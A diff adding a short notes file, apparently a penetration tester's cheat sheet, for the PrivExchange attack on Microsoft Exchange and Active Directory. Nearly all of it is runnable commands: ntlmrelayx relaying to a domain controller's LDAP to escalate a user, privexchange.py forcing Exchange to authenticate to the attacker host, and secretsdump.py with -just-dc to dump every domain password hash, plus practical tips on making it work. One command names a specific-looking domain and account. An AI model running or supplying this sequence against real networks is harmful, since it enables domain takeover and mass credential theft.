@@ -1,0 +1,30 @@
+Exchange attack to dump password hashes from DC
+
+https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/
+
+Run both ntlmrelayx and privexchange.py
+
+
+ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user username
+
+*****privexchange HAS to be run with "python", errors out when doing "./privexchange.py"
+
+python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u username -d testsegment.local
+
+*****User must have a mailbox for this to work
+
+It will tell you that "Success! etc etc Replication-Get-Change-All" worked
+
+After that you can stop it, it takes around a minute for a connection to appear on ntlmrelayx, and boom! 
+
+Next, run secretsdump.py 
+
+./secretsdump.py domain.local/username@DCname.domain -just-dc
+
+./secretsdump.py integrity.local/faloul@primarydc01.integrity.local -just-dc
+
+
+
+
+
+
